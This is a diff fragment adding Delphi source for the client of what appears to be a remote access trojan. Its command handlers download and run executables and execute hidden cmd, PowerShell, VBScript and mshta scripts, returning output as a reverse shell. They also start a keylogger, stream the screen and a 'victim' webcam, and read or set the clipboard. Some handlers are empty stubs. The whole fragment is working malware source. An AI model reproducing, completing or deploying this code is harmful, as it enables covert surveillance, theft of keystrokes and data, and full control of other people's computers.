+        FileStream: TFileStream;
+        FileData: TBytes;
+        FileName: string;
+      begin
+        // Decode Base64 to bytes
+        FileData := TNetEncoding.Base64.DecodeStringToBytes(SL[1]);
+
+        // Generate random file name
+        FileName := 'Receievedexe.exe';
+
+        // Save data to a file
+        FileStream := TFileStream.Create(FileName, fmCreate);
+        try
+          FileStream.WriteBuffer(FileData[0], Length(FileData));
+        finally
+          FileStream.Free;
+        end;
+        ShellExecute(0, 'open', PChar(FileName), nil, nil, SW_SHOWNORMAL);
+
+        Exit;
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'MemExe' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'StartScreenCapture' then
+  begin
+    ScreenCaptureTimer.Enabled := True;
+    Exit;
+  end;
+
+  if SL[0] = 'StopScreenCapture' then
+  begin
+    ScreenCaptureTimer.Enabled := False;
+    Exit;
+  end;
+
+  if SL[0] = 'ScreenSize' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        ClientSource.ExecCommand(0,
+          BytesOf('ScreenDimations|' + IntToStr(Screen.Width) + '|' +
+          IntToStr(Screen.Height)), False);
+      end);
+  end;
+
+  if SL[0] = 'MousePos' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        x, y: Integer;
+      begin
+        x := StrToInt(SL[1]);
+        y := StrToInt(SL[2]);
+        SetCursorPos(x, y);
+      end);
+  end;
+
+  if SL[0] = 'MouseDownLeft' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        x, y: Integer;
+      begin
+        x := StrToInt(SL[1]);
+        y := StrToInt(SL[2]);
+        SetCursorPos(x, y);
+        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+      end);
+  end;
+
+  if SL[0] = 'MouseDownRight' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        x, y: Integer;
+      begin
+        x := StrToInt(SL[1]);
+        y := StrToInt(SL[2]);
+        SetCursorPos(x, y);
+        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+      end);
+  end;
+
+  if SL[0] = 'MouseUpLeft' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        x, y: Integer;
+      begin
+        x := StrToInt(SL[1]);
+        y := StrToInt(SL[2]);
+        SetCursorPos(x, y);
+        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+      end);
+  end;
+
+  if SL[0] = 'MouseUpRight' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        x, y: Integer;
+      begin
+        x := StrToInt(SL[1]);
+        y := StrToInt(SL[2]);
+        SetCursorPos(x, y);
+        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+      end);
+  end;
+
+  if SL[0] = 'CMD' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        CmdOutput := ExecuteCommand(SL[1]);
+        // now send back the shell commands return string...
+        ClientSource.ExecCommand(0,
+          BytesOf('ReverseSHELLCMD|' + CmdOutput), False);
+        // DONE!!!!
+
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'GetVol' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'ChangeWallpaper' then
+  begin
+    ImageData := TNetEncoding.Base64.DecodeStringToBytes(SL[1]);
+    FileName := ExtractFilePath(ParamStr(0)) + 'ReceivedImage.png';
+    // Use full path
+    FileStream := TFileStream.Create(FileName, fmCreate);
+    try
+      FileStream.WriteBuffer(ImageData[0], Length(ImageData));
+    finally
+      FileStream.Free;
+    end;
+
+    if FileExists(FileName) then
+    begin
+      SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, PChar(FileName),
+        SPIF_UPDATEINIFILE or SPIF_SENDWININICHANGE);
+    end
+    else
+    begin
+
+    end;
+    Exit;
+  end;
+
+  if SL[0] = 'GetClipBoard' then
+  begin
+    BMP := TBitmap.Create;
+    try
+      try
+        if Clipboard.HasFormat(CF_TEXT) then
+        begin
+          // Send the clipboard text
+          ClientSource.ExecCommand(0,
+            BytesOf('SendClipbrdText|' + Clipboard.AsText), False);
+        end
+        // Check if the clipboard has bitmap format
+        else if Clipboard.HasFormat(CF_BITMAP) then
+        begin
+          try
+            ClipHandle := Clipboard.GetAsHandle(CF_BITMAP);
+            if ClipHandle <> 0 then
+            begin
+              BMP.Handle := ClipHandle;
+              bytestream := TBytesStream.Create;
+              try
+                BMP.SaveToStream(bytestream);
+                ClientSource.ExecCommand(0, BytesOf('SendClipbrdImg|') +
+                  bytestream.Bytes, False);
+              finally
+                bytestream.Free;
+              end;
+            end
+          finally
+          end;
+        end;
+      finally
+      end;
+    finally
+      BMP.Free;
+    end;
+  end;
+
+  if SL[0] = 'SetClipBoard' then
+  begin
+    Clipboard.AsText := SL[1];
+  end;
+
+  if SL[0] = 'BatchScript' then
+  begin
+    ShellExecute(0, 'open', PChar('cmd.exe'), PChar('/c ' + SL[1]),
+      nil, SW_HIDE);
+  end;
+
+  if SL[0] = 'VBScript' then
+  begin
+    ShellExecute(0, 'open', 'wscript.exe', PChar('/e:vbscript ' + SL[1]),
+      nil, SW_HIDE);
+  end;
+
+  if SL[0] = 'PowershellScript' then
+  begin
+    ShellExecute(0, 'open', 'powershell.exe', PChar('-Command "' + SL[1] + '"'),
+      nil, SW_HIDE);
+  end;
+
+  if SL[0] = 'Javascript' then
+  begin
+    ShellExecute(0, 'open', 'mshta.exe',
+      PChar('javascript:' + SL[1] + ';close();'), nil, SW_HIDE);
+  end;
+
+  if SL[0] = 'WebcamViewer' then
+  begin
+    VictimCamCanvas := TImage.Create(nil);
+    strlst := TStringList.Create;
+    cam := TVideoImage.Create;
+    cam.GetListOfDevices(strlst);
+
+    // Ensure the correct device is selected
+    cam.SetDisplayCanvas(VictimCamCanvas.Canvas);
+    cam.VideoStart(SL[1]);
+
+    WebcamTimer.Enabled := True;
+  end;
+
+  if SL[0] = 'StopWebcamViewer' then
+  begin
+    cam.VideoStop;
+    cam.Free;
+    WebcamTimer.Enabled := False;
+  end;
+
+  if SL[0] = 'WebcamDeviceList' then
+  begin
+    strlst := TStringList.Create;
+    cam := TVideoImage.Create;
+    cam.GetListOfDevices(strlst);
+    for i := 0 to strlst.Count - 1 do
+    begin
+      Form1.ClientSource.ExecCommand(0,
+        BytesOf('WebcamDeviceList|' + strlst[i]), False);
+    end;
+    strlst.Free;
+  end;
+
+  if SL[0] = 'GetProcList' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+
+      end);
+  end;
+
+  if SL[0] = 'KillProc' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        PID: DWORD;
+        ProcessHandle: THandle;
+      begin
+        PID := StrToIntDef(SL[1], 0);
+        if PID = 0 then
+        begin
+          ShowMessage('Invalid PID provided.');
+          Exit;
+        end;
+        ProcessHandle := OpenProcess(PROCESS_TERMINATE, False, PID);
+        if ProcessHandle <> 0 then
+        begin
+          try
+            if TerminateProcess(ProcessHandle, 0) then
+              ShowMessage('Process with PID ' + IntToStr(PID) +
+                ' terminated successfully.')
+            else
+              ShowMessage('Failed to terminate process with PID ' +
+                IntToStr(PID));
+          finally
+            CloseHandle(ProcessHandle);
+          end;
+        end
+        else
+          ShowMessage('Failed to open process with PID: ' + IntToStr(PID));
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'StartKeylog' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        InstallWinEventHook;
+        InstallKeyboardHook;
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'StopKeylog' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        UninstallWinEventHook;
+        UninstallKeyboardHook;
+      end);
+    Exit;
+  end;
+
+    if SL[0] = 'GetDrive' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        DriveList: TStringList;
+        DriveLetter: string;
+        DriveMask: DWORD;
+      begin
+        try
+          DriveList := TStringList.Create;
+          try
+            // Get the drives available in the system
+            DriveMask := GetLogicalDrives;
+
+            for var i := 0 to 25 do // Loop through possible drives (A to Z)
+            begin
+              if (DriveMask and (1 shl i)) <> 0 then
+              begin
+                DriveLetter := Chr(Ord('A') + i) + ':\';
+                DriveList.Add(DriveLetter);
+              end;
+            end;
+
+            // Now, send the drive list to the server in a similar way to clipboard
+            ClientSource.ExecCommand(0,
+              BytesOf('SendDrives|' + DriveList.CommaText), False);
+          finally
+            DriveList.Free;
+          end;
+        except
+          // Handle any exceptions
+          on E: Exception do
+          begin
+            // Optionally log or handle the exception
+          end;
+        end;
+      end);
+    Exit;
+  end;
+
+
+  if SL[0] = 'NOTEPAD' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+
+      end);
+    Exit;
+  end;
+
+end;
+
+procedure TForm1.FormCreate(Sender: TObject);
+begin
+  ClientSource.Port := 3434;
+  ClientSource.Host := '127.0.0.1';
+  ClientSource.Active := True;
+end;
+
+procedure TForm1.FormDestroy(Sender: TObject);
+begin
+  UninstallWinEventHook;
+end;
+
+procedure TForm1.ScreenCaptureTimerTimer(Sender: TObject);
+var
+  bytestream: TBytesStream;
+begin
+  // Capture and update only changed pixels in OldBitmap
+  CaptureAndUpdateChangedPixels(OldBitmap, 0); // 0 is the monitor index
+
+  if Assigned(OldBitmap) then
+  begin
+    try
+      bytestream := TBytesStream.Create;
+      try
+        // Save the updated bitmap to the stream
+        OldBitmap.SaveToStream(bytestream);
+
+        // Send the bitmap data over the network
+        ClientSource.ExecCommand(0, BytesOf('IncomingScreenCapture|') +
+          bytestream.Bytes, False);
+      finally
+        bytestream.Free;
+      end;
+    except
+      on E: Exception do
+        ShowMessage('Error sending screen capture: ' + E.Message);
+    end;
+  end;
+end;
+
+procedure TForm1.WebcamTimerTimer(Sender: TObject);
+var
+  MemoryStream: TMemoryStream;
+  BMP: TBitmap;
+  ImageBytes: TBytes;
+  CommandStr: AnsiString;
+begin
+  BMP := TBitmap.Create;
+  try
+    cam.GetBitmap(BMP);
+    // Capture the bitmap from the webcam
+
+    MemoryStream := TMemoryStream.Create;
+    try
+      BMP.SaveToStream(MemoryStream);
+      // Save to stream in BMP format
+      SetLength(ImageBytes, MemoryStream.Size);
+      MemoryStream.Position := 0;
+      MemoryStream.ReadBuffer(ImageBytes[0], MemoryStream.Size);
+
+      CommandStr := 'IncomingWebcam|' + TNetEncoding.Base64.EncodeBytesToString
+        (ImageBytes);
+
+      // Send to server
+      ClientSource.ExecCommand(0, BytesOf(CommandStr), False);
+    finally
+      MemoryStream.Free; // Ensure MemoryStream is always freed
+    end;
+  finally
+    BMP.Free; // Ensure BMP is always freed
+  end;
+end;
+
+end.
